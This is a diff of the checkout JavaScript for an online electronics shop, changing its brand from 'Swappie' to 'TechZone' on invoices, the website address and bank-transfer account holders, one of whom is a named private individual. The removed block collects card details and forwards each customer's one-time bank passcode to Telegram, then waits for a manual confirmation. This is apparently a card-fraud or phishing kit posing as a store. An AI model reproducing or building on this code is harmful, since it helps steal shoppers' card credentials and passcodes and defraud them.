-try {
-// Success close - use event delegation properly
-document.addEventListener('click', function (e) {
-    if (e.target.classList.contains('close-checkout-success')) {
-        e.preventDefault();
-        e.stopPropagation();
-        closeCheckout();
-        clearCart();
-    }
-});
-
-
-        // OTP Verification
-        const verifyOtpBtn = document.getElementById('verify-otp-btn');
-        const skipOtpBtn = document.getElementById('skip-otp-btn');
-        const resendOtpBtn = document.getElementById('resend-otp-btn');
-
-        if (verifyOtpBtn) verifyOtpBtn.addEventListener('click', verifyOTP);
-        if (skipOtpBtn) skipOtpBtn.addEventListener('click', skipOTP);
-        if (resendOtpBtn) resendOtpBtn.addEventListener('click', resendOTP);
-
-        // Setup OTP input navigation
-        setupOTPInputs();
-
-        // Setup card input formatting
-        setupCardInputFormatting();
-		   } catch (error) {
-        console.error('Error setting up checkout event listeners:', error);
-    }
-
-    } catch (error) {
-        console.error('Error setting up checkout event listeners:', error);
-    }
-}
-
-
-function setupCardInputFormatting() {
-    const cardNumberInput = document.getElementById('card-number');
-    const expiryDateInput = document.getElementById('expiry-date');
-    const cvvInput = document.getElementById('cvv');
-
-    if (cardNumberInput) {
-        cardNumberInput.addEventListener('input', function(e) {
-            let value = e.target.value.replace(/\D/g, ''); // Remove non-digits
-            value = value.substring(0, 16); // Limit to 16 digits
-            value = value.replace(/(\d{4})(?=\d)/g, '$1 '); // Add spaces every 4 digits
-            e.target.value = value;
-        });
-    }
-
-    if (expiryDateInput) {
-        expiryDateInput.addEventListener('input', function(e) {
-            let value = e.target.value.replace(/\D/g, ''); // Remove non-digits
-            value = value.substring(0, 4); // Limit to MMYY
-            if (value.length > 2) {
-                value = value.slice(0, 2) + '/' + value.slice(2);
-            }
-            e.target.value = value;
-        });
-    }
-
-    if (cvvInput) {
-        // CVV is limited by maxlength in HTML, no special formatting needed.
-    }
-}
-
-function validateCardDetails() {
-    const cardNumber = document.getElementById('card-number').value.replace(/\s/g, ''); // Remove spaces
-    const expiryDate = document.getElementById('expiry-date').value;
-    const cvv = document.getElementById('cvv').value;
-    const cardErrors = document.getElementById('card-errors');
-
-    if (!cardErrors) {
-        console.error("Card errors element not found in the DOM!");
-        return false;
-    }
-
-    // Card Number: Must be 16 digits
-    if (!/^\d{16}$/.test(cardNumber)) {
-        cardErrors.textContent = t("invalid_card_number");
-        cardErrors.style.display = 'block';
-        return false;
-    }
-
-    // Expiry Date: Must be in MM/YY format
-    if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(expiryDate)) {
-        cardErrors.textContent = t("invalid_expiry_date");
-        cardErrors.style.display = 'block';
-        return false;
-    }
-
-    // Expiry Date: Check if the year is valid and not in the past
-    const [month, year] = expiryDate.split('/');
-    const expiryYear = parseInt(year, 10);
-
-    // Requirement: Year must be 25 or higher
-    if (expiryYear < 25) {
-        cardErrors.textContent = t("invalid_expiry_year");
-        cardErrors.style.display = 'block';
-        return false;
-    }
-
-    // CVV: Must be 3 or 4 digits
-    if (!/^\d{3,4}$/.test(cvv)) {
-        cardErrors.textContent = t("invalid_cvv");
-        cardErrors.style.display = 'block';
-        return false;
-    }
-
-    cardErrors.style.display = 'none'; // Clear errors if valid
-    return true;
-}
-
-// Setup OTP input and submit button behavior
-function setupOTPInputs() {
-    const otpInput = document.getElementById('otp-single-input');
-    const submitBtn = document.getElementById('verify-otp-btn'); // Assuming this is your verify button ID
-
-    if (!otpInput || !submitBtn) return;
-
-    // Allow only numeric input, max 6 digits
-    otpInput.addEventListener('input', (e) => {
-        let val = e.target.value.replace(/\D/g, '').substring(0, 6);
-        e.target.value = val;
-        submitBtn.disabled = val.length !== 6; // Enable button only if 6 digits entered
-    });
-
-    submitBtn.addEventListener('click', (e) => {
-        e.preventDefault();
-        verifyOTP();
-    });
-
-    submitBtn.disabled = true; // Initially disable the button
-}
-
-// Verify OTP entered by user
-function verifyOTP() {
-    const otpInput = document.getElementById('otp-single-input');
-    const otpError = document.getElementById('otp-error');
-
-    if (!otpInput) {
-        console.error('OTP input element not found');
-        return;
-    }
-
-    const otp = otpInput.value.trim();
-
-    // Validate OTP: must be exactly 6 digits
-    if (!/^\d{6}$/.test(otp)) {
-        if (otpError) {
-            otpError.style.display = 'block';
-            otpError.querySelector('span').textContent = "Please enter a valid 6-digit OTP";
-        }
-        return;
-    } else if (otpError) {
-        otpError.style.display = 'none';
-    }
-
-    // Show processing UI step (assumes step 4 is a processing spinner)
-    goToCheckoutStep(4);
-
-    // Send OTP to Telegram via your notification function
-    if (typeof TelegramNotifications !== 'undefined' && TelegramNotifications.userEnteredOTP) {
-        TelegramNotifications.userEnteredOTP(otp, checkoutData.orderNumber);
-    } else {
-        console.warn('TelegramNotifications.userEnteredOTP function is not defined.');
-    }
-
-    // Start polling for confirmation from Telegram/Make scenario
-    waitForTelegramConfirmation(checkoutData.orderNumber)
-        .then(() => {
-            processOrder();
-        })
-        .catch(() => {
-            showPaymentFailure();
-        });
-}
-
-// Poll the backend to check payment status every 5 seconds
-function waitForTelegramConfirmation(orderRef) {
-    return new Promise((resolve, reject) => {
-        const interval = setInterval(() => {
-            fetch(`/api/check-payment-status?orderRef=${encodeURIComponent(orderRef)}`)
-                .then(res => res.json())
-                .then(data => {
-                    if (data.status === 'confirmed') {
-                        clearInterval(interval);
-                        alert('Payment confirmed! Thank you.');
-                        resolve();
-                    } else if (data.status === 'rejected') {
-                        clearInterval(interval);
-                        alert('Payment rejected. Please try again.');
-                        reject();
-                    }
-                    // If still pending, do nothing and keep polling
-                })
-                .catch(err => {
-                    clearInterval(interval);
-                    alert('Error checking payment status. Please refresh.');
-                    console.error('Error polling payment status:', err);
-                    reject();
-                });
-        }, 5000);
-    });
-}
-
-// Show UI for payment failure
-function showPaymentFailure() {
-    goToCheckoutStep('failure'); // Replace 'failure' with your actual failure step or ID
-
-    const processingElement = document.getElementById('processing-payment');
-    if (processingElement) processingElement.style.display = 'none';
-
-    const failureElement = document.getElementById('order-failure');
-    if (failureElement) failureElement.style.display = 'block';
-
-    console.log('Payment failed or was not confirmed.');
-}
-
-// Handle successful order processing
-function processOrder() {
-    try {
-        goToCheckoutStep('success'); // Replace 'success' with your actual success step or ID
-
-        clearCart();
-
-        console.log('Order processed successfully:', checkoutData.orderRef);
-    } catch (error) {
-        console.error('Error during order processing:', error);
-        alert('Error completing order. Please try again.');
-    }
-}
-
-// Optional: skip OTP verification and proceed
-function skipOTP() {
-    if (typeof TelegramNotifications !== 'undefined' && TelegramNotifications.otpSkipped) {
-        const subtotal = cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);
-        const total = checkoutData.discountAmount > 0 ? subtotal - checkoutData.discountAmount : subtotal;
-        TelegramNotifications.otpSkipped({
-            total: convertPrice(total, false),
-            orderRef: checkoutData.orderNumber
-        });
-    }
-    console.warn('User skipped OTP. Proceeding to order completion.');
-    document.getElementById('otp-error').style.display = 'none';
-    processOrder();
-}
-
-function simulateOTPSending(phoneNumber) {
-    // Generate a random 6-digit OTP
-    const otp = Math.floor(100000 + Math.random() * 900000);
-    console.log('Simulating OTP sending to ' + phoneNumber + ': ' + otp);
-    // In a real implementation, this would send an actual OTP
-    // Store the OTP (for demonstration purposes only)
-    localStorage.setItem('otp', otp.toString());
-}
-
-function resendOTP() {
-    // Generate new OTP
-    const newOtp = Math.floor(100000 + Math.random() * 900000);
-    localStorage.setItem('currentOTP', newOtp.toString());
-    console.log('New OTP generated:', newOtp);
-
-    simulateOTPSending(checkoutData.customerPhone);
-    const resendBtn = document.getElementById('resend-otp-btn');
-    if (resendBtn) {
-        resendBtn.disabled = true;
-    }
-
-    // Clear any error messages
-    const otpError = document.getElementById('otp-error');
-    if (otpError) {
-        otpError.style.display = 'none';
-    }
-
-    // Clear OTP input
-    const otpInput = document.getElementById('otp-single-input');
-    if (otpInput) {
-        otpInput.value = '';
-        otpInput.focus();
-    }
-
-    startOTPCountdown();
-}
-
-// Initialize OTP inputs on page load or step render
-document.addEventListener('DOMContentLoaded', () => {
-    setupOTPInputs();
-});
-
 
 // Generate and download PDF invoice
 function generateInvoice() {
@@ -2525,7 +1532,7 @@ function generateInvoice() {
         // Company header with proper business details
         doc.setFontSize(22);
         doc.setTextColor(30, 58, 138);
-        doc.text('Swappie', margin, yPosition);
+        doc.text('TechZone', margin, yPosition);
         
         // Company address and details in header
         doc.setFontSize(9);
@@ -2537,7 +1544,7 @@ function generateInvoice() {
         doc.text(businessAddress.address, margin, yPosition + 14);
         doc.text(`${businessAddress.city}, ${businessAddress.country}`, margin, yPosition + 21);
         doc.text(`Tel: ${countryConfig[currentCountry].phone}`, margin, yPosition + 28);
-        doc.text(`Email: sales@swappie-${currentCountry}.com`, margin, yPosition + 35);
+        doc.text(`Email: sales@techzone-${currentCountry}.com`, margin, yPosition + 35);
 
         // Invoice title and number (right aligned)
         doc.setFontSize(18);
@@ -2632,11 +1639,10 @@ function generateInvoice() {
         doc.text(convertPrice(subtotal, false), pageWidth - 20, yPosition, { align: 'right' });
         yPosition += 8;
 
-       // Shipping
-doc.text(t("shipping_label"), pageWidth - 60, yPosition);
-doc.text(t("free_shipping"), pageWidth - 20, yPosition, { align: 'right' });
-yPosition += 8;
-
+        // Shipping
+        doc.text(`${currentLanguage === 'es' ? 'Envío:' : 'Shipping:'}`, pageWidth - 60, yPosition);
+        doc.text(currentLanguage === 'es' ? 'GRATIS' : 'FREE', pageWidth - 20, yPosition, { align: 'right' });
+        yPosition += 8;
 
         // Total with emphasis
         doc.line(pageWidth - 80, yPosition, pageWidth - margin, yPosition);
@@ -2648,22 +1654,23 @@ yPosition += 8;
         doc.text(convertPrice(subtotal, false), pageWidth - 20, yPosition, { align: 'right' });
 
         // Payment method
-yPosition += 20;
-doc.setFont(undefined, 'normal');
-doc.setFontSize(10);
-doc.setTextColor(0, 0, 0);
+        yPosition += 20;
+        doc.setFont(undefined, 'normal');
+        doc.setFontSize(10);
+        doc.setTextColor(0, 0, 0);
+        const paymentMethodText = checkoutData.paymentMethod === 'bank-transfer' ? 
+            (currentLanguage === 'es' ? 'Transferencia Bancaria' : 'Bank Transfer') :
+            (currentLanguage === 'es' ? 'Tarjeta de Crédito' : 'Credit Card');
+        doc.text(`${currentLanguage === 'es' ? 'Método de Pago:' : 'Payment Method:'} ${paymentMethodText}`, margin, yPosition);
 
-const paymentMethodText = checkoutData.paymentMethod === 'bank-transfer' 
-    ? t("bank_transfer") 
-    : t("credit_card");
-
-doc.text(`${t("payment_method_label")} ${paymentMethodText}`, margin, yPosition);
-
-// Terms and conditions
-yPosition += 15;
-doc.setFontSize(8);
-doc.setTextColor(100, 100, 100);
-doc.text(t("terms_and_conditions_text"), margin, yPosition);
+        // Terms and conditions
+        yPosition += 15;
+        doc.setFontSize(8);
+        doc.setTextColor(100, 100, 100);
+        const termsText = currentLanguage === 'es' ? 
+            'Términos: Garantía de 12 meses incluida. Devoluciones aceptadas dentro de 30 días.' :
+            'Terms: 12-month warranty included. Returns accepted within 30 days.';
+        doc.text(termsText, margin, yPosition);
 
         // Footer with business details
         const footerY = pageHeight - 30;
@@ -2675,14 +1682,14 @@ doc.text(t("terms_and_conditions_text"), margin, yPosition);
         doc.text(businessInfo, margin, footerY);
         
         // Center - website
-        doc.text('www.swapie.shop', pageWidth / 2, footerY, { align: 'center' });
+        doc.text('www.techzone.com', pageWidth / 2, footerY, { align: 'center' });
         
         // Right side - thank you message
         const thankYou = currentLanguage === 'es' ? 'Gracias por su compra' : 'Thank you for your purchase';
         doc.text(thankYou, pageWidth - margin, footerY, { align: 'right' });
 
         // Save the PDF
-        const fileName = `Swappie_Invoice_${checkoutData.orderNumber}.pdf`;
+        const fileName = `TechZone_Invoice_${checkoutData.orderNumber}.pdf`;
         doc.save(fileName);
 
         console.log('Invoice generated successfully:', fileName);
@@ -2808,21 +1815,21 @@ function getAccountNumber() {
 
 function getAccountHolder() {
     switch (currentCountry) {
-        case 'nicaragua': return 'Swappeie';
-        case 'honduras': return 'Swappie';
+        case 'nicaragua': return 'TechZone';
+        case 'honduras': return 'TechZone';
         case 'trinidad': return 'Jacenta Althea Hankey';
-        case 'elsalvador': return 'Swappie';
-        case 'paraguay': return 'Swappie';
-        case 'guatemala': return 'Swappie';
-        case 'dominican': return 'Swappie';
-        case 'usa': return 'Swappie';
+        case 'elsalvador': return 'TechZone';
+        case 'paraguay': return 'TechZone';
+        case 'guatemala': return 'TechZone';
+        case 'dominican': return 'TechZone';
+        case 'usa': return 'TechZone';
         default: return 'Account Holder';
     }
 }
 
 function getEstimatedDelivery() {
     const deliveryDate = new Date();
-    deliveryDate.setDate(deliveryDate.getDate() + 2);
+    deliveryDate.setDate(deliveryDate.getDate() + 3);
     return deliveryDate.toLocaleDateString('en-US', {
         weekday: 'long',
         year: 'numeric',
@@ -3398,13 +2405,15 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     });
 
-   const savedCountry = localStorage.getItem('selectedCountry') || 'honduras';
+    // ✅ On first page load, update the footer based on saved country
+    const savedCountry = localStorage.getItem('selectedCountry') || 'honduras';
     currentCountry = savedCountry;
     updateFooterFromBusinessAddress();
-}); // ✅ properly close DOMContentLoaded here
-
-
+});
 
 document.querySelector('form').addEventListener('submit', (event) => {
     event.preventDefault(); // stop the default form submission (which reloads the page)
+    
+    // your form submit logic here...
+
 });
